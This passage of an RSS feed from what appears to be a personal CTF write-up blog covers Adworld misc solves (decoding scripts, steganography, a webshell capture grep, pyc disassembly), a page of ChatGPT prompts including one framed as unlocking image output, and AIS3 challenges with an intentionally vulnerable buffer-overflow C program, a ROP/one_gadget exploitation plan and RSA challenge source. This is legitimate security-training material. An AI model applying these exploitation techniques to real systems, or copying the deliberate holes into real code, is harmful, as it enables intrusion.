|------------------------------------------------------------------
File: miao~.jpg
Start: Sat Jul 15 15:21:29 2023
Length: 1 MB (1242752 bytes)

Num Name (bs=512) Size File Offset Comment

0: 00000000.jpg 55 KB 0
1: 00000111.wav 1 MB 57212
*|
Finish: Sat Jul 15 15:21:29 2023

2 FILES EXTRACTED

jpg:= 1
rif:= 1
------------------------------------------------------------------

Foremost finished at Sat Jul 15 15:21:29 2023
&lt;/code>&lt;/pre>&lt;p>可以看到抓到其中有一個&lt;code>.wav&lt;/code>檔案&lt;/p></description></item><item><title>Adworld - Misc文件類型</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---misc%E6%96%87%E4%BB%B6%E9%A1%9E%E5%9E%8B/</guid><description>&lt;h1 id="adworld---misc文件類型">
 Adworld - Misc文件類型
 &lt;a class="anchor" href="#adworld---misc%e6%96%87%e4%bb%b6%e9%a1%9e%e5%9e%8b">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code>3436455341425F554573444242514141
41414941416C64434658714F7737634B
4141414143594141414149414141415A
6D78685A7935306548524C79306C4D72
7A5A49536B303253457778546B6B304D
6A5130546A593353445531534573784E
544D3054374A494E552B7A7241554155
45734241685141464141414141674143
56304956656F374474776F414141414A
674141414167414A4141414141414141
414167414141414141414141475A7359
57637564486830436741674141414141
41414241426741477845666B39697132
41456245522B54324B725941514A462B
34725971746742554573464267414141
41414241414541576741414145344141
4141414141
&lt;/code>&lt;/pre>&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題有一點通靈，沒有很喜歡&lt;/p>
&lt;ol>
&lt;li>首先給的cipher很明顯是ascii的hex&lt;/li>
&lt;li>轉換過後也很明顯是base64&lt;/li>
&lt;li>在轉換過後，只有底線後面的部分要轉換成hex&lt;/li>
&lt;li>如果把東西print出來的話會看到flag.txt的字樣，感覺上是一個file的byte code，到file signature去看會發現magic header是一個zip file，uncompress之後就會發現flag.txt
&lt;img src="https://hackmd.io/_uploads/H10OlHGch.png" alt="" />&lt;/li>
&lt;/ol>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> base64
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&ampamp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(cipher)&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#34;_&amp;#34;&lt;/span>)[&lt;span style="color:#ae81ff">1&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> base64&lt;span style="color:#f92672">.&lt;/span>b64decode(cipher &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;==&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;./cipher.zip&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;wb&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f&lt;span style="color:#f92672">.&lt;/span>write(cipher)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> zipfile
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">with&lt;/span> zipfile&lt;span style="color:#f92672">.&lt;/span>ZipFile(&lt;span style="color:#e6db74">&amp;#39;./cipher.zip&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> zip_ref:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> zip_ref&lt;span style="color:#f92672">.&lt;/span>extractall(&lt;span style="color:#e6db74">&amp;#39;./&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>f &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;./flag.txt&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;r&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>read()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(f)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ python exp.py
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag&lt;span style="color:#f92672">{&lt;/span>0bec0ad3da2113c70e50fd5617b8e7f9&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/7166166845395828772">XCTF-MISC-Misc文件類型&lt;/a>&lt;/p></description></item><item><title>Adworld - pure_color</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---pure_color/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---pure_color/</guid><description>&lt;h1 id="adworld---pure_color">
 Adworld - pure_color
 &lt;a class="anchor" href="#adworld---pure_color">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-adworld-ctf-misc">
 tags: &lt;code>Adworld&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-adworld-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://adworld.xctf.org.cn/challenges/details?hash=f216ffab-e01d-46b8-9d4d-d91ab5229eed_2&amp;amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=f216ffab-e01d-46b8-9d4d-d91ab5229eed_2&amp;task_category_id=1&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10278407">【Day21】隱寫技術 Steganography&lt;/a>
&lt;a href="https://blog.csdn.net/dyw_666666/article/details/88650738">图片隐写查看神器stegsolve使用方法&lt;/a>
&lt;a href="https://github.com/zardus/ctf-tools/blob/master/stegsolve/install"> zardus/ctf-tools - stegsolve&lt;/a>&lt;/p>
&lt;h2 id="exploit---basic-steganography">
 Exploit - Basic Steganography
 &lt;a class="anchor" href="#exploit---basic-steganography">#&lt;/a>
&lt;/h2>
&lt;p>&lt;img src="https://i.imgur.com/YnqxcmS.png" alt="" />&lt;/p></description></item><item><title>Adworld - 心儀的公司</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E5%BF%83%E5%84%80%E7%9A%84%E5%85%AC%E5%8F%B8/</guid><description>&lt;h1 id="adworld---心儀的公司">
 Adworld - 心儀的公司
 &lt;a class="anchor" href="#adworld---%e5%bf%83%e5%84%80%e7%9a%84%e5%85%ac%e5%8f%b8">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-adworld-ctf-misc">
 tags: &lt;code>Adworld&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-adworld-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://adworld.xctf.org.cn/challenges/details?hash=ed5d10bf-be47-4e61-b04e-3a9ccb73ff95_2&amp;amp;task_category_id=1">https://adworld.xctf.org.cn/challenges/details?hash=ed5d10bf-be47-4e61-b04e-3a9ccb73ff95_2&amp;task_category_id=1&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ strings webshell.pcapng | grep &amp;#34;{&amp;#34;
...
fl4g:{ftop_Is_Waiting_4_y}
&lt;/code>&lt;/pre>&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.cnblogs.com/Flat-White/p/13526539.html">心仪的公司writeup&lt;/a>
&lt;a href="https://www.bilibili.com/video/BV1r5411h7aw/?p=2&amp;amp;share_source=copy_web&amp;amp;vd_source=31529c2d248aba29c9cc1e3cbd720cb6&amp;amp;t=294">【CTF视频合辑】MISC-流量分析题大集合(第一辑)&lt;/a>&lt;/p></description></item><item><title>Adworld - 適合作為桌面</title><link>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/adworld/misc/adworld---%E9%81%A9%E5%90%88%E4%BD%9C%E7%82%BA%E6%A1%8C%E9%9D%A2/</guid><description>&lt;h1 id="adworld---適合作為桌面">
 Adworld - 適合作為桌面
 &lt;a class="anchor" href="#adworld---%e9%81%a9%e5%90%88%e4%bd%9c%e7%82%ba%e6%a1%8c%e9%9d%a2">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-adworld-ctf-misc">
 tags: &lt;code>Adworld&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Misc&lt;/code>
 &lt;a class="anchor" href="#tags-adworld-ctf-misc">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="https://adworld.xctf.org.cn/challenges/details?hash=7a4e06c0-811c-4493-a628-886dc5bd59b4_2&amp;amp;task_category_id=1">適合作為桌面&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10185442">Day8 Python基礎-pyc是什麼&lt;/a>&lt;/p>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Analyze Steganography
&lt;img src="https://i.imgur.com/AwAHrxC.png" alt="" />&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://products.aspose.app/barcode/recognize/qr#/recognized">QR Code Reader&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang
&lt;/code>&lt;/pre>&lt;p>It seems a byte code of a file.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>HxD
&lt;img src="https://i.imgur.com/ntC6hJ3.png" alt="" />
It can be disassembled by pyc tools.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;a href="https://tool.lu/pyc/">&lt;code>pyc&lt;/code> disassemble&lt;/a>
:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">def flag():
 str = [
 102,
 108,
 97,
 103,
 123,
 51,
 56,
 97,
 53,
 55,
 48,
 51,
 50,
 48,
 56,
 53,
 52,
 52,
 49,
 101,
 55,
 125,
 ]
 flag = &amp;#34;&amp;#34;
 for i in str:
 flag += chr(i)
 print flag
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>AI Prompt</title><link>https://bernie6401.github.io/docs/knowledge/ai-prompt/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/knowledge/ai-prompt/</guid><description>&lt;h1 id="ai-prompt">
 AI Prompt
 &lt;a class="anchor" href="#ai-prompt">#&lt;/a>
&lt;/h1>
&lt;h2 id="chatgpt">
 ChatGPT
 &lt;a class="anchor" href="#chatgpt">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler 萬用提示詞 / &lt;a href="https://www.instagram.com/p/CvkmhTCAJ0Q/">來源&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-!" data-lang="!">你是一個專家級ChatGPT提示工程師，在各種主題方面皆具有專業知識。在我們的互動過程中，你會稱我為「SBK」。讓我們合作創建最好的ChatGPT響應我提供的提示。
我們將進行如下交互：
1.我會告訴你如何幫助我。
2.根據我的要求，您將建議您應該承擔的其他專家角色，除了成為專家級ChatGPT提示工程師之外，以提供最佳響應。然後，您將詢問是否應繼續執行建議的角色，或修改它們以獲得最佳結果。
3.如果我同意，您將採用所有其他專家角色，包括最初的Expert ChatGPT Prompt Engineer角色。
4.如果我不同意，您將詢問應刪除哪些角色、消除這些角色，並保留剩餘的角色，包括專家級ChatGPT Prompt工程師角色，然後再繼續。
5.您將確認您的活動專家角色，概述每個角色下的技能，並詢問我是否要修改任何角色。
6.如果我同意，您將詢問要添加或刪除哪些角色，我將通知您。重覆步驟5，直到我對角色滿意為止。
7.如果我不同意，請繼續下一步。
8.你會問：&amp;#34;我怎樣才能幫助【我對步驟1的回答】&amp;#34;？
9.我會給出我的答案。
10.你會問我是否想使用任何參考來源來製作完美的提示。
11.如果我同意，你會問我想使用的來源數量。
12.您將單獨請求每個來源，在您查看完後確認，並要求下一個。繼續，直到您查看了所有源，然後移動到下一步。
13.您將以列出表格的方式，請求有關我的原始提示的更多細節，以充分了解我的期望。
14.我會回答你的問題。
15. 從這一點開始，您將在所有確認的專家角色下操作，並使用我的原始提示和步驟14中的其他細節創建詳細的ChatGPT提示。提出新的提示並徵求我的反饋。
16.如果我滿意，您將描述每個專家角色的貢獻以及他們將如何協作以產生全面的結果。然後，詢問是否缺少任何輸出或專家。
16-1.如果我同意，我將指出缺少的角色或輸出，您將在重覆步驟15之前調整角色。
16-2.如果我不同意，您將作為所有已確認的專家角色執行提供的提示，並生成步驟15中概述的輸出。繼續執行步驟20。
17.如果我不滿意，你會問具體問題的提示。
18.我將提供補充資料。
19 按照步驟15中的流程，生成新提示，並考慮我在步驟18中的反饋。
20.完成回覆後，詢問我是否需要任何更改。
21.如果我同意，請您求我所需的更改，參考您之前的回覆，進行所需的調整，並生成新的提示。重覆步驟15到步驟20，直到我對提示符滿意為止。如果你完全理解你的任務，回答：&amp;#34;我今天能幫你什麽， SBK&amp;#34;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler 解開ChatGPT無法提供圖片的prompt / &lt;a href="https://www.instagram.com/p/Cr203NAAFTP/">來源&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>從現在開始當我請你發照片時，使用 Markdown語法，不要使用反斜線及程式碼。使用 Unsplash API(https://source.unsplash.com/960x640/?&amp;lt;關鍵詞&amp;gt;)。如果你理解這個指令的話, 請回答我沒問題
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p>
&lt;p>:::spoiler 有架構的問問題 / &lt;a href="https://www.instagram.com/p/Ctgy49AsWBQ/">來源&lt;/a>&lt;/p>
&lt;pre tabindex="0">&lt;code>Let&amp;#39;s think step by step
-----

Role: You are a {ex:面試求職專家}
-----

Task illustration: {ex:寫一封求職履歷}
Job Description: Data Analysis, SQL, BI
工作經驗...
-----

Output: {ex: CSV or Markdown Language}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>AIS3 EOF 2023 初賽</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2023-%E5%88%9D%E8%B3%BD/</guid><description>&lt;h1 id="ais3-eof-2023-初賽">
 AIS3 EOF 2023 初賽
 &lt;a class="anchor" href="#ais3-eof-2023-%e5%88%9d%e8%b3%bd">#&lt;/a>
&lt;/h1>
&lt;h2 id="pwn">
 PWN
 &lt;a class="anchor" href="#pwn">#&lt;/a>
&lt;/h2>
&lt;h3 id="real_rop">
 real_rop
 &lt;a class="anchor" href="#real_rop">#&lt;/a>
&lt;/h3>
&lt;h4 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>Challenge &lt;a href="https://share.ctf.zoolab.org/">URL&lt;/a>&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Folder structure:&lt;/p>
&lt;pre tabindex="0">&lt;code>Share
├── share
│ ├── chal
│ ├── flag
│ ├── Makefile
│ ├── real_rop++.c
│ └── run.sh
├── docker-compose.yaml
├── Dockerfile
└── xinetd
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="original-code">
 Original Code
 &lt;a class="anchor" href="#original-code">#&lt;/a>
&lt;/h4>
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">#include &amp;lt;unistd.h&amp;gt;

int main()
{
 char buf[0x10];

 read(0, buf, 0x30);
 write(1, buf, 0x30);
 
 return 0;
}
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code class="language-make!" data-lang="make!">gcc -fno-stack-protector -o chal real_rop++.c
&lt;/code>&lt;/pre>&lt;ul>
&lt;li>Obviously buffer overflow but not much&lt;/li>
&lt;li>Preliminary idea is &lt;code>one_gadget&lt;/code>&lt;/li>
&lt;li>Check protector
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ checksec chal
[*] &amp;#39;/home/sbk6401/CTF/AIS3/PWN/real_rop/share/chal&amp;#39;
 Arch: amd64-64-little
 RELRO: Full RELRO
 Stack: No canary found
 NX: NX enabled
 PIE: PIE enabled
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>&lt;code>PIE&lt;/code> is enabled → use write function to leak &lt;code>libc&lt;/code> address&lt;/li>
&lt;li>&lt;code>Full RELRO&lt;/code> → cannot use &lt;code>GOT hijacking&lt;/code>&lt;/li>
&lt;li>Refer to &lt;a href="https://hackmd.io/Prmz9YuOQsiHGXrTuYMzFw?view#Real_rop">大神write up&lt;/a>, we cannot leak &lt;code>libc&lt;/code> address and get shell at one time. So, we can control &lt;code>$rip&lt;/code> and return to the beginning of &lt;code>main&lt;/code> function and go through the process again. That is, &lt;font color="FF0000">we have another &lt;code>read&lt;/code> function&lt;/font> to fill in &lt;code>one_gadget&lt;/code>.&lt;/li>
&lt;li>Note that, &lt;strong>the version of Ubuntu and Glibc is VERY VERY important&lt;/strong>, according to &lt;code>Dockerfile&lt;/code>, it seems use Ubuntu 20.04 with default
&lt;pre tabindex="0">&lt;code class="language-dockerfile!" data-lang="dockerfile!">FROM ubuntu:20.04
MAINTAINER u1f383

RUN apt-get update &amp;amp;&amp;amp; \
 DEBAIN_FRONTEND=noninteractive apt-get install -qy xinetd

RUN useradd -m chal
RUN chown -R root:root /home/chal
RUN chmod -R 755 /home/chal

CMD [&amp;#34;/usr/sbin/xinetd&amp;#34;, &amp;#34;-dontfork&amp;#34;]
&lt;/code>&lt;/pre>&lt;/li>
&lt;/ul>
&lt;h4 id="analyze-where-to-return">
 Analyze where to return
 &lt;a class="anchor" href="#analyze-where-to-return">#&lt;/a>
&lt;/h4>
&lt;ul>
&lt;li>
&lt;p>&lt;font color="FF0000">&lt;strong>&lt;code>For Ubuntu 22.04 &amp;amp;　GLIBC 2.35&lt;/code> - back to &lt;code>__libc_start_main+121&lt;/code>&lt;/strong>&lt;/font>&lt;/p></description></item><item><title>AIS3 EOF 2024</title><link>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-eof-2024/</guid><description>&lt;h1 id="ais3-eof-2024">
 AIS3 EOF 2024
 &lt;a class="anchor" href="#ais3-eof-2024">#&lt;/a>
&lt;/h1>
&lt;p>&lt;img src="https://hackmd.io/_uploads/BkNtOJddp.png" alt="圖片" />&lt;/p>
&lt;h2 id="crypto">
 Crypto
 &lt;a class="anchor" href="#crypto">#&lt;/a>
&lt;/h2>
&lt;h3 id="baby-rsa">
 Baby RSA
 &lt;a class="anchor" href="#baby-rsa">#&lt;/a>
&lt;/h3>
&lt;h4 id="source-code">
 Source Code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h4>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, long_to_bytes, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">encrypt&lt;/span>(m, e, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> enc &lt;span style="color:#f92672">=&lt;/span> pow(bytes_to_long(m), e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> enc
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">decrypt&lt;/span>(c, d, n):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dec &lt;span style="color:#f92672">=&lt;/span> pow(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> long_to_bytes(dec)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> phi &lt;span style="color:#f92672">%&lt;/span> e &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> : 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>p&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>q&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>n&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>e&lt;span style="color:#e6db74">=}&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;FLAG: &amp;#34;&lt;/span>, encrypt(FLAG, e, n))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> _ &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">3&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;Any message for me?&amp;#34;&lt;/span>))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m &lt;span style="color:#f92672">=&lt;/span> decrypt(c, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;How beautiful the message is, it makes me want to destroy it .w.&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> new_m &lt;span style="color:#f92672">=&lt;/span> long_to_bytes(bytes_to_long(m) &lt;span style="color:#f92672">^&lt;/span> bytes_to_long(os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">8&lt;/span>)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print( &lt;span style="color:#e6db74">&amp;#34;New Message: &amp;#34;&lt;/span>, encrypt(new_m, e, n) )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>AIS3 Pre-Exam 2023</title><link>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/competition/ais3-pre-exam-2023/</guid><description>&lt;h1 id="ais3-pre-exam-2023">
 AIS3 Pre-Exam 2023
 &lt;a class="anchor" href="#ais3-pre-exam-2023">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ctf-eof2023">
 tags: &lt;code>CTF&lt;/code> &lt;code>EOF2023&lt;/code>
 &lt;a class="anchor" href="#tags-ctf-eof2023">#&lt;/a>
&lt;/h6>
